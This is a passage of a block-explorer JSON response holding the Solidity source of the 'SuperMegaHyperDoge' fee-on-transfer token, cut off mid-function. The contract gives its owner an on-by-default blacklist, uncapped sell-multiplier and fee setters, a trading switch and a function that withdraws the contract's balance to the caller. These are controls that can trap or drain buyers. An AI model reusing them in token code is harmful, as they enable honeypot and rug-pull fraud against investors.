{"status":"1","message":"OK","result":[{"SourceCode":"{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"github/mrkawdy/supermegahyperdoge/supermegahyperdoge.sol\": {\r\n      \"content\": \"/**\\n  \\n  #SuperMegaHyperDoge\\n  \\n  #SuperMegaHyperDoge features:\\n  \\n   4% fee auto adds to the liquidity pool \\n                    &\\n   6% marketing fee for huge marketing funds \\n                    =\\n                                                   ,:\\n                                                 ,' |\\n                                                /   :\\n                                             --'   /\\n                                             \\\\/ />/\\n                                             / /_\\\\\\n                                          __/   /\\n                                          )'-. /\\n                                          ./  :\\\\\\n                                           /.' '\\n                                         '/'\\n                                         +\\n                                        '\\n                                      `.\\n                                  .-\\\"-\\n                                 (    |\\n                              . .-'  '.\\n                             ( (.   )8:\\n                         .'    / (_  )\\n                          _. :(.   )8P  `\\n                      .  (  `-' (  `.   .\\n                       .  :  (   .a8a)\\n                      /_`( \\\"a `a. )\\\"'\\n                  (  (/  .  ' )=='\\n                 (   (    )  .8\\\"   +\\n                   (`'8a.( _(   (\\n                ..-. `8P    ) `  )  +\\n              -'   (      -ab:  )\\n            '    _  `    (8P\\\"Ya\\n          _(    (    )b  -`.  ) +\\n         ( 8)  ( _.aP\\\" _a   \\\\( \\\\   *\\n       +  )/    (8P   (88    )  )\\n          (a:f   \\\"     `\\\"       `\\n          \\n  #SuperMegaHyperDoge\\n  \\n   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\\n@@@@@@@@@@@@@@@@@@@@@@%##(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\\n@@@@@@@@@@@@@@@@@@@%##(((((##@@@@@@@@@@@@@@@@@@@&%#(%%@@@@@@@@@@@@@@@@@@@@@@@@@@\\n@@@@@@@@@@@@@@@&%%#((((((((#%@@@@@@@@@@@@@@@@@@######(%&(@@@@@@@@@@@@@@@@@@@@@@@\\n@@@@@@@@@@@@@(#((((((((((((##%#@@@@@@@@@@@@@@@%/#(#%((#(#%@#####%@@@@@@@@@@@@@@@\\n@@@@@@@@@@##((((((((((((((((##%&@@@%###&&&@@@@&%(((%((((#%((#%(((#%&@@@@@@@@@@@@\\n@@@@@@@@@%##(((((((((((((((((((#((((((((((((##%(((((((((%((((((#((((##%@@@@@@@@@\\n@@@@@@@@@%((%(%((((((((((((((((((%(((((((((((((((((((((((#(((((%((((((##@@@@@@@@\\n@@@@@@@@@##(((((%(((((((((((((((((((((((((((((((((((((#((#(%(((((((((#%#@@@@@@@@\\n@@@@@@@@@&#%(#(((((##((((((((((((#%(&%(((#((((%&((((((#@@@@#(##%%((((#(#@@@@@@@@\\n@@@@@@@@@@@%%(((((((((((((((((((((((((((#((((((((((((((((((((##%###((((#(@@@@@@@\\n@@@@@@@@@@@&%%(((((((((((((((((((((((#&      @(((((((((&  %(((#(%####((##(@@@@@@\\n@@@@@@@@@@@%%(((((((((((((((((((((((#         /(((((((,     %(((#/###%###%#%@@@@\\n@@@@@@@@@@@%#(((((((((((((((((((((((/    ,@@   #(((((%   %&  %((%(##############\\n@@@@@@@@@@%%((((((((((((((((((((((((.         ,((((((#       /((%###############\\n@@@@@@@@@@%%(((((((((((((((((((((((##         ##((((((*      #((%###############\\n@@@@@@@@@@%%(((((((((((((((((((((((((%.     %((((((((((#    ,(((#/(#############\\n@@@@@@@@@@%/##((((((((((#((((((((((((((((((((((((%....#((##(((((#(#//###########\\n@@@@@@@@@@%%%(((((((((# .......%#((((((((((((&%%&&%%%&&&&&&&&(#%/ ..#,((((((((((\\n@@@@@@@@@@%#%%(((((% ............... ,(###/...(@@&&&&&&&&%&&&........,,(((((((((\\n@@@@@@@@@@@&%%%#((#..............................@@%&&&&%@@ ........../,((((((((\\n@@@@@@@@@@@@@@%%%%.................................#&&&%@.............*,((((((((\\n@@@@@@@@@@@@@@@@/((...........................   ....... ............,,(((((((((\\n@@@@@@@@@@@@@@@@@@@%,*.........................@@@@&&&%%,..........,(,/(((((((((\\n@@@@@@@@@@@@@@@@@@@%,*((//......................,#(@%&/........./(/*((((((((((((\\n@@@@@@@@@@@@@@@@@@@@@@@@(%%%%%%#* ........................,(/,/////(((((((((((((\\n@@@@@@@@@@@@@@@@@@@@@@@@/%%%%%%#%%%%%&#./*# .........&#//#######################\\n@@@@@@@@@@@@@@@@@@@@@@@@(%%%%%%#(#&%%%%%(*///,(###%&#%%#,,,,,,,,,,,,,,,,,,,,,,,, \\n/**@@@@@@@@@@@@@@@@@@@@@&&%%%%#%(((((((%...........%((@#%%%#,,,,,,,,,,,,,,,,,,,,,,,\\n@@@@@@@@@@@@@@@@@@@&%&#%%%&(((((((%.............. %#((&%%%*,,,,,,,,,,,,,,,,,,,,,\\n@@@@@@@@@@@@@@@@@@@&%%%%%((((((##&.................&((&&#%%((,,,,,,,,,,,,,,,,,,,\\n@@@@@@@@@@@@@@@@@@&%%%%&(((((((#(.................../(##%#%%%%,,,,,,,,,,,,,,,,,,\\n@@@@@@@@@@@@@@@@&%%%%#&((((((#%(.....................,(((#%%%%#,,,,,,,,,,,,,,,,,\\n@@@@@@@@@@@@@@@@#%%%%&(((((((%%.......................//((#&%%%&(,,,,,,,,,,,,,,,\\n@@@@@@@@@@@@@&&%%%%%&((((((##(.........................(((#(##%%&#,,,,,,,,,,,,,,\\n@@@@@@@@@@&%%&%%%%%%((((((((#@..........................&(#&((&##&%,,,,,,,,,,,,,\\n@@@@@@@@@@&%%%%%%%%%#((((((%(#...........................#((##((&#&/,,,,,,,,,,,,\\n@@@@@@@&&%%#&%%%%%%((((((((%((...........................@((&(((((&&&*,,,,,,,,,,\\n@@@@@@&&%%%&#%%%%#&((((((((((#...........................(((%(((((((@%&#,,,,,,,,\\n@@@@@%%%%%%&%%%%%%(((((((#%((&.........................../((%((((((((#((##%/,,,,\\n@@@@/%%%%%#%%%%%%&(((((((%&(((#..........................%((&#((((((((((((%%%(,,\\n@@@&&%%%%%#%%%%%###(((((((%((((/.........................#((&%%((#%#&(#(###%(%%/\\n@@@%#%%%%%%&%%%%%%(%((((((%(((((%.......................%##&%%%%%#(#(#((&(((((%(\\n@@&&%%%%%%%&%%%%#%(((%#((#((((((((%...................%(((#%%%%%%%#%(%##%&%&&&%(\\n@@&&%%%%%%%%#%&@%%(%((%#((%(((((((((#(#@%/,..,*#@@((#(((#%%&&&@@&%&((((%&&@&%#%/\\n@@@@&%%%%%%%&%&%%%#((((#%(((((((((((%#(((((((((((((((((&@@&&&&&&&&&&&&%%%&&&%#%/\\n@@@@&%&%%%%%%&&%%%%%%%#%((((((((((((#(((((((((((#((%%(((&%&&&&&&&&&&&&&&%&&&%#%/\\n@@@@@@@&&%%%%%%%%%%%%%#%(((((((((((%&&&&&&&@%(((#(((((#((#&&&&&&&&&&&&&&&@@&%#%/\\n@@@@@@@@@@&(&%&&%%%%%%%%(((((((((((&%&&&&&&%((((((((((##(#&&&&&&&&&&&&&&&&&&&&&&\\n@@@@@@@@@@@@@@@@%%%%%%%%(((((((((((%%(((((@&##(((((((((%##&&&&&&&&&&&&&&&&&&&&&&\\n@@@@@@@@@@@@@@@@@@@&%%%%(((((((((#%(######@.##(((((((((%&#&&&&&&&&&&&&&&&&&&&&&&\\n@@@@@@@@@@@@@@@@@@@&%%%%(((((((((((&######@%%((((((((##%%#&&&&&&&&&&&&&&&&&&&&&&\\n@@@@@@@@@@@@@@@@@@@&%%%@(((((((((%#&######@%%(((((((((%%%#&&&&&&&&&&&&&&&&&&&&&&\\n@@@@@@@@@@@@@@@@@@@@@@@%##(((((((&#&######@@/(((((((#(&@%#&&&&&&&&&&&&&&&&&&&&&&\\n@@@@@@@@@@@@@@@@@@@@@@@*%#((((((#*#&######@@*##(((((##/&%#&&&&&&&&&&&&&&&&&&&&&&\\n@@@@@@@@@@@@@@@@@@@@@@@*%(((((((%%(&######@@(%(((((((%#&%#&&&&&&&&&&&&&&&&&&&&&&\\n@@@@@@@@@@@@@@@@@@@@@@@&&((((((##%(&######@@&&(((((((%%&%#&&&&&&&&&&&&&&&&&&&&&&\\n@@@@@@@@@@@@@@@@@@@@@@@&&((((((%#%(&######@@&#((((((%.#&%#&&&&&&&&&&&&&&&&&&&&&&\\n@@@@@@@@@@@@@@@@@@@@@@&%((((((((%(%&######@@%%(((((((#%%%&&&&&&&&&&&&&&&&&&&&&&&\\n@@@@@@@@@@@@@@@@@@@@@@@%#((#(&#(%(%#######@@%%((##%(##(#&#&&&&&&&&&&&&&&&&&&&&&&\\n@@@@@@@@@@@@@@@@@@@@@@@@@@%@@&##&&&&&&&&&&&&&&&%%&&%%&%%%%%%%%%%%%%%%%%%%%%%%%%% \\n\\n#SuperMegaHyperDoge\\n\\n*/\\n\\n// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.7.4;\\n\\nlibrary SafeMath {\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        require(c >= a, \\\"SafeMath: addition overflow\\\");\\n\\n        return c;\\n    }\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return sub(a, b, \\\"SafeMath: subtraction overflow\\\");\\n    }\\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\n        require(b <= a, errorMessage);\\n        uint256 c = a - b;\\n\\n        return c;\\n    }\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n\\n        uint256 c = a * b;\\n        require(c / a == b, \\\"SafeMath: multiplication overflow\\\");\\n\\n        return c;\\n    }\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return div(a, b, \\\"SafeMath: division by zero\\\");\\n    }\\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\n        require(b > 0, errorMessage);\\n        uint256 c = a / b;\\n        return c;\\n    }\\n}\\n\\n/**\\n * BEP20 standard interface.\\n */\\ninterface IBEP20 {\\n    function totalSupply() external view returns (uint256);\\n    function decimals() external view returns (uint8);\\n    function symbol() external view returns (string memory);\\n    function name() external view returns (string memory);\\n    function getOwner() external view returns (address);\\n    function balanceOf(address account) external view returns (uint256);\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\n    function allowance(address _owner, address spender) external view returns (uint256);\\n    function approve(address spender, uint256 amount) external returns (bool);\\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n}\\n\\nabstract contract Auth {\\n    address internal owner;\\n    mapping (address => bool) internal authorizations;\\n\\n    constructor(address _owner) {\\n        owner = _owner;\\n        authorizations[_owner] = true;\\n    }\\n\\n    modifier onlyOwner() {\\n        require(isOwner(msg.sender), \\\"!OWNER\\\"); _;\\n    }\\n\\n    modifier authorized() {\\n        require(isAuthorized(msg.sender), \\\"!AUTHORIZED\\\"); _;\\n    }\\n\\n    function authorize(address adr) public onlyOwner {\\n        authorizations[adr] = true;\\n    }\\n\\n    function unauthorize(address adr) public onlyOwner {\\n        authorizations[adr] = false;\\n    }\\n\\n    function isOwner(address account) public view returns (bool) {\\n        return account == owner;\\n    }\\n\\n    function isAuthorized(address adr) public view returns (bool) {\\n        return authorizations[adr];\\n    }\\n\\n    function transferOwnership(address payable adr) public onlyOwner {\\n        owner = adr;\\n        authorizations[adr] = true;\\n        emit OwnershipTransferred(adr);\\n    }\\n\\n    event OwnershipTransferred(address owner);\\n}\\n\\ninterface IDEXFactory {\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\n}\\n\\ninterface IDEXRouter {\\n    function factory() external pure returns (address);\\n    function WETH() external pure returns (address);\\n\\n    function addLiquidity(\\n        address tokenA,\\n        address tokenB,\\n        uint amountADesired,\\n        uint amountBDesired,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountA, uint amountB, uint liquidity);\\n\\n    function addLiquidityETH(\\n        address token,\\n        uint amountTokenDesired,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\\n\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n\\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external payable;\\n\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n}\\n\\ninterface IDividendDistributor {\\n    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;\\n    function setShare(address shareholder, uint256 amount) external;\\n    function deposit() external payable;\\n    function process(uint256 gas) external;\\n}\\n\\ncontract DividendDistributor is IDividendDistributor {\\n    using SafeMath for uint256;\\n\\n    address public _token;\\n    address public _owner;\\n\\n    struct Share {\\n        uint256 amount;\\n        uint256 totalExcluded;\\n        uint256 totalRealised;\\n    }\\n\\n    IBEP20 RWRD = IBEP20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\\n\\n    address[] shareholders;\\n    mapping (address => uint256) shareholderIndexes;\\n    mapping (address => uint256) shareholderClaims;\\n\\n    mapping (address => Share) public shares;\\n\\n    uint256 public totalShares;\\n    uint256 public totalDividends;\\n    uint256 public totalDistributed;\\n    uint256 public dividendsPerShare;\\n    uint256 public dividendsPerShareAccuracyFactor = 10 ** 18;\\n\\n    uint256 public minPeriod = 45 * 60;\\n    uint256 public minDistribution = 1 * (10 ** 16);\\n\\n    uint256 currentIndex;\\n\\n    bool initialized;\\n    modifier initialization() {\\n        require(!initialized);\\n        _;\\n        initialized = true;\\n    }\\n\\n    modifier onlyToken() {\\n        require(msg.sender == _token || msg.sender == _owner); _;\\n    }\\n\\n    constructor (address _tokenowner) {\\n        _token = msg.sender;\\n        _owner = _tokenowner;\\n    }\\n\\n    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {\\n        minPeriod = _minPeriod;\\n        minDistribution = _minDistribution;\\n    }\\n\\n    function setShare(address shareholder, uint256 amount) external override onlyToken {\\n        if(shares[shareholder].amount > 0){\\n            distributeDividend(shareholder);\\n        }\\n\\n        if(amount > 0 && shares[shareholder].amount == 0){\\n            addShareholder(shareholder);\\n        }else if(amount == 0 && shares[shareholder].amount > 0){\\n            removeShareholder(shareholder);\\n        }\\n\\n        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);\\n        shares[shareholder].amount = amount;\\n        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);\\n    }\\n\\n    function deposit() external payable override onlyToken {\\n        totalDividends = totalDividends.add(msg.value);\\n        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(msg.value).div(totalShares));\\n    }\\n\\n    function process(uint256 gas) external override onlyToken {\\n        uint256 shareholderCount = shareholders.length;\\n\\n        if(shareholderCount == 0) { return; }\\n\\n        uint256 gasUsed = 0;\\n        uint256 gasLeft = gasleft();\\n\\n        uint256 iterations = 0;\\n\\n        while(gasUsed < gas && iterations < shareholderCount) {\\n            if(currentIndex >= shareholderCount){\\n                currentIndex = 0;\\n            }\\n\\n            if(shouldDistribute(shareholders[currentIndex])){\\n                distributeDividend(shareholders[currentIndex]);\\n            }\\n\\n            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));\\n            gasLeft = gasleft();\\n            currentIndex++;\\n            iterations++;\\n        }\\n    }\\n    \\n    function shouldDistribute(address shareholder) internal view returns (bool) {\\n        return shareholderClaims[shareholder] + minPeriod < block.timestamp\\n                && getUnpaidEarnings(shareholder) > minDistribution;\\n    }\\n\\n    function distributeDividend(address shareholder) internal {\\n        if(shares[shareholder].amount == 0){ return; }\\n\\n        uint256 amount = getUnpaidEarnings(shareholder);\\n        if(amount > 0){\\n            totalDistributed = totalDistributed.add(amount);\\n\\n            payable(shareholder).transfer(amount);\\n            \\n            shareholderClaims[shareholder] = block.timestamp;\\n            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);\\n            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);\\n        }\\n    }\\n    \\n    function claimDividend() external {\\n        distributeDividend(msg.sender);\\n    }\\n\\n    function getUnpaidEarnings(address shareholder) public view returns (uint256) {\\n        if(shares[shareholder].amount == 0){ return 0; }\\n\\n        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);\\n        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;\\n\\n        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }\\n\\n        return shareholderTotalDividends.sub(shareholderTotalExcluded);\\n    }\\n\\n    function getCumulativeDividends(uint256 share) internal view returns (uint256) {\\n        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);\\n    }\\n\\n    function addShareholder(address shareholder) internal {\\n        shareholderIndexes[shareholder] = shareholders.length;\\n        shareholders.push(shareholder);\\n    }\\n\\n    function removeShareholder(address shareholder) internal {\\n        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];\\n        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];\\n        shareholders.pop();\\n    }\\n}\\n\\ncontract SuperMegaHyperDoge is IBEP20, Auth {\\n    using SafeMath for uint256;\\n\\n    address public WBNB = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\\n    address DEAD = 0x000000000000000000000000000000000000dEaD;\\n    address ZERO = 0x0000000000000000000000000000000000000000;\\n\\n    string constant _name = \\\"SuperMegaHyperDoge\\\";\\n    string constant _symbol = \\\"SMHDoge\\\";\\n    uint8 constant _decimals = 4;\\n\\n    uint256 _totalSupply = 4.2 * 10**9 * 10**_decimals;\\n\\n    uint256 public _maxTxAmount = _totalSupply;\\n    uint256 public _maxWalletToken = _totalSupply;\\n\\n    mapping (address => uint256) _balances;\\n    mapping (address => mapping (address => uint256)) _allowances;\\n\\n    bool public blacklistMode = true;\\n    mapping (address => bool) public isBlacklisted;\\n\\n\\n    mapping (address => bool) isFeeExempt;\\n    mapping (address => bool) isTxLimitExempt;\\n    mapping (address => bool) isTimelockExempt;\\n    mapping (address => bool) isDividendExempt;\\n\\n    uint256 public liquidityFee    = 4;\\n    uint256 public reflectionFee   = 0;\\n    uint256 public marketingFee    = 6;\\n    uint256 public teamFee         = 0;\\n    uint256 public devFee          = 0;\\n    uint256 public burnFee         = 0;\\n    uint256 public totalFee        = marketingFee + reflectionFee + liquidityFee + teamFee + burnFee + devFee;\\n    uint256 public feeDenominator  = 100;\\n\\n    uint256 public sellMultiplier  = 100;\\n\\n    address public autoLiquidityReceiver;\\n    address public marketingFeeReceiver;\\n    address public teamFeeReceiver;\\n    address public burnFeeReceiver;\\n    address public devFeeReceiver;\\n\\n    uint256 targetLiquidity = 95;\\n    uint256 targetLiquidityDenominator = 100;\\n\\n    IDEXRouter public router;\\n    address public pair;\\n\\n    bool public tradingOpen = false;\\n\\n    DividendDistributor public distributor;\\n    uint256 distributorGas = 500000;\\n\\n    bool public buyCooldownEnabled = false;\\n    uint8 public cooldownTimerInterval = 60;\\n    mapping (address => uint) private cooldownTimer;\\n\\n    bool public swapEnabled = true;\\n    uint256 public swapThreshold = _totalSupply * 10 / 10000;\\n    bool inSwap;\\n    modifier swapping() { inSwap = true; _; inSwap = false; }\\n\\n    constructor () Auth(msg.sender) {\\n        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\n\\n        WBNB = router.WETH();\\n        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));\\n        _allowances[address(this)][address(router)] = uint256(-1);\\n\\n        distributor = new DividendDistributor(address(msg.sender));\\n\\n        isFeeExempt[msg.sender] = true;\\n        isTxLimitExempt[msg.sender] = true;\\n\\n        isTimelockExempt[msg.sender] = true;\\n        isTimelockExempt[DEAD] = true;\\n        isTimelockExempt[address(this)] = true;\\n\\n        isDividendExempt[pair] = true;\\n        isDividendExempt[address(this)] = true;\\n        isDividendExempt[DEAD] = true;\\n\\n        autoLiquidityReceiver = msg.sender;\\n        marketingFeeReceiver = msg.sender;\\n        teamFeeReceiver = msg.sender;\\n        devFeeReceiver = msg.sender;\\n        burnFeeReceiver = DEAD;\\n\\n        _balances[msg.sender] = _totalSupply;\\n        emit Transfer(address(0), msg.sender, _totalSupply);\\n    }\\n\\n    receive() external payable { }\\n\\n    function totalSupply() external view override returns (uint256) { return _totalSupply; }\\n    function decimals() external pure override returns (uint8) { return _decimals; }\\n    function symbol() external pure override returns (string memory) { return _symbol; }\\n    function name() external pure override returns (string memory) { return _name; }\\n    function getOwner() external view override returns (address) { return owner; }\\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\\n\\n    function approve(address spender, uint256 amount) public override returns (bool) {\\n        _allowances[msg.sender][spender] = amount;\\n        emit Approval(msg.sender, spender, amount);\\n        return true;\\n    }\\n\\n    function approveMax(address spender) external returns (bool) {\\n        return approve(spender, uint256(-1));\\n    }\\n\\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\\n        return _transferFrom(msg.sender, recipient, amount);\\n    }\\n\\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\\n        if(_allowances[sender][msg.sender] != uint256(-1)){\\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, \\\"Insufficient Allowance\\\");\\n        }\\n\\n        return _transferFrom(sender, recipient, amount);\\n    }\\n\\n    function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000) external onlyOwner() {\\n        _maxWalletToken = (_totalSupply * maxWallPercent_base1000 ) / 1000;\\n    }\\n    function setMaxTxPercent_base1000(uint256 maxTXPercentage_base1000) external onlyOwner() {\\n        _maxTxAmount = (_totalSupply * maxTXPercentage_base1000 ) / 1000;\\n    }\\n\\n    function setTxLimit(uint256 amount) external authorized {\\n        _maxTxAmount = amount;\\n    }\\n\\n\\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\\n        if(inSwap){ return _basicTransfer(sender, recipient, amount); }\\n\\n        if(!authorizations[sender] && !authorizations[recipient]){\\n            require(tradingOpen,\\\"Trading not open yet\\\");\\n        }\\n\\n        // Blacklist\\n        if(blacklistMode){\\n            require(!isBlacklisted[sender] && !isBlacklisted[recipient],\\\"Blacklisted\\\");    \\n        }\\n\\n\\n        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != teamFeeReceiver  && recipient != autoLiquidityReceiver && recipient != burnFeeReceiver){\\n            uint256 heldTokens = balanceOf(recipient);\\n            require((heldTokens + amount) <= _maxWalletToken,\\\"Total Holding is currently limited, you can not buy that much.\\\");}\\n        \\n        if (sender == pair &&\\n            buyCooldownEnabled &&\\n            !isTimelockExempt[recipient]) {\\n            require(cooldownTimer[recipient] < block.timestamp,\\\"Please wait for 1min between two buys\\\");\\n            cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;\\n        }\\n\\n        // Checks max transaction limit\\n        checkTxLimit(sender, amount);\\n\\n        if(shouldSwapBack()){ swapBack(); }\\n\\n        //Exchange tokens\\n        _balances[sender] = _balances[sender].sub(amount, \\\"Insufficient Balance\\\");\\n\\n        uint256 amountReceived = (!shouldTakeFee(sender) || !shouldTakeFee(recipient)) ? amount : takeFee(sender, amount,(recipient == pair));\\n        _balances[recipient] = _balances[recipient].add(amountReceived);\\n\\n        // Dividend tracker\\n        if(!isDividendExempt[sender]) {\\n            try distributor.setShare(sender, _balances[sender]) {} catch {}\\n        }\\n\\n        if(!isDividendExempt[recipient]) {\\n            try distributor.setShare(recipient, _balances[recipient]) {} catch {} \\n        }\\n\\n        try distributor.process(distributorGas) {} catch {}\\n\\n        emit Transfer(sender, recipient, amountReceived);\\n        return true;\\n    }\\n    \\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\\n        _balances[sender] = _balances[sender].sub(amount, \\\"Insufficient Balance\\\");\\n        _balances[recipient] = _balances[recipient].add(amount);\\n        emit Transfer(sender, recipient, amount);\\n        return true;\\n    }\\n\\n    function checkTxLimit(address sender, uint256 amount) internal view {\\n        require(amount <= _maxTxAmount || isTxLimitExempt[sender], \\\"TX Limit Exceeded\\\");\\n    }\\n\\n    function shouldTakeFee(address sender) internal view returns (bool) {\\n        return !isFeeExempt[sender];\\n    }\\n\\n    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {\\n        \\n        uint256 multiplier = isSell ? sellMultiplier : 100;\\n        uint256 feeAmount = amount.mul(totalFee).mul(multiplier).div(feeDenominator * 100);\\n\\n        uint256 burnTokens = feeAmount.mul(burnFee).div(totalFee);\\n        uint256 contractTokens = feeAmount.sub(burnTokens);\\n\\n        _balances[address(this)] = _balances[address(this)].add(contractTokens);\\n        _balances[burnFeeReceiver] = _balances[burnFeeReceiver].add(burnTokens);\\n        emit Transfer(sender, address(this), contractTokens);\\n        \\n        if(burnTokens > 0){\\n            emit Transfer(sender, burnFeeReceiver, burnTokens);    \\n        }\\n\\n        return amount.sub(feeAmount);\\n    }\\n\\n    function shouldSwapBack() internal view returns (bool) {\\n        return msg.sender != pair\\n        && !inSwap\\n        && swapEnabled\\n        && _balances[address(this)] >= swapThreshold;\\n    }\\n\\n    function clearStuckBalance(uint256 amountPercentage) external authorized {\\n        uint256 amountBNB = address(this).balance;\\n        payable(marketingFeeReceiver).transfer(amountBNB * amountPercentage / 100);\\n    }\\n\\n    function clearStuckBalance_sender(uint256 amountPercentage) external authorized {\\n        uint256 amountBNB = address(this).balance;\\n        payable(msg.sender).transfer(amountBNB * amountPercentage / 100);\\n    }\\n\\n    function set_sell_multiplier(uint256 Multiplier) external onlyOwner{\\n        sellMultiplier = Multiplier;        \\n    }\\n\\n    // switch Trading\\n    function tradingStatus(bool _status) public onlyOwner {\\n        tradingOpen = _status;\\n    }\\n\\n    // enable cooldown between trades\\n    function cooldownEnabled(bool _status, uint8 _interval) public onlyOwner {\\n        buyCooldownEnabled = _status;\\n        cooldownTimerInterval = _interval;\\n    }\\n\\n    function swapBack() internal swapping {\\n        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;\\n        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);\\n        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);\\n\\n        address[] memory path = new address[](2);\\n        path[0] = address(this);\\n        path[1] = WBNB;\\n\\n        uint256 balanceBefore = address(this).balance;\\n\\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\\n            amountToSwap,\\n            0,\\n            path,\\n            address(this),\\n            block.timestamp\\n        );\\n\\n        uint256 amountBNB = address(this).balance.sub(balanceBefore);\\n\\n        uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));\\n        \\n        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);\\n        uint256 amountBNBReflection = amountBNB.mul(reflectionFee).div(totalBNBFee);\\n        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);\\n        uint256 amountBNBTeam = amountBNB.mul(teamFee).div(totalBNBFee);\\n        uint256 amountBNBDev = amountBNB.mul(devFee).div(totalBNBFee);\\n\\n        try distributor.deposit{value: amountBNBReflection}() {} catch {}\\n        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}(\\\"\\\");\\n        (tmpSuccess,) = payable(teamFeeReceiver).call{value: amountBNBTeam, gas: 30000}(\\\"\\\");\\n        (tmpSuccess,) = payable(devFeeReceiver).call{value: amountBNBDev, gas: 30000}(\\\"\\\");\\n        \\n        // because life isnt fair\\n        tmpSuccess = false;\\n\\n        if(amountToLiquify > 0){\\n            router.addLiquidityETH{value: amountBNBLiquidity}(\\n                address(this),\\n                amountToLiquify,\\n                0,\\n                0,\\n                autoLiquidityReceiver,\\n                block.timestamp\\n            );\\n            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);\\n        }\\n    }\\n\\n\\n    function setIsDividendExempt(address holder, bool exempt) external authorized {\\n        require(holder != address(this) && holder != pair);\\n        isDividendExempt[holder] = exempt;\\n        if(exempt){\\n            distributor.setShare(holder, 0);\\n        }else{\\n            distributor.setShare(holder, _balances[holder]);\\n        }\\n    }\\n\\n    function enable_blacklist(bool _status) public onlyOwner {\\n        blacklistMode = _status;\\n    }\\n\\n    function manage_blacklist(address[] calldata addresses, bool status) public onlyOwner {\\n        for (uint256 i; i < addresses.length; ++i) {\\n            isBlacklisted[addresses[i]] = status;\\n        }\\n    }\\n\\n\\n    function setIsFeeExempt(address holder, bool exempt) external authorized {\\n        isFeeExempt[holder] = exempt;\\n    }\\n\\n    function setIsTxLimitExempt(address holder, bool exempt) external authorized {\\n        isTxLimitExempt[holder] = exempt;\\n    }\\n\\n    function setIsTimelockExempt(address holder, bool exempt) external authorized {\\n        isTimelockExempt[holder] = exempt;\\n    }\\n\\n    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _teamFee, uint256 _burnFee, uint256 _devFee, uint256 _feeDenominator) external authorized {\\n        liquidityFee = _liquidityFee;\\n        reflectionFee = _reflectionFee;\\n        marketingFee = _marketingFee;\\n        teamFee = _teamFee;\\n        devFee = 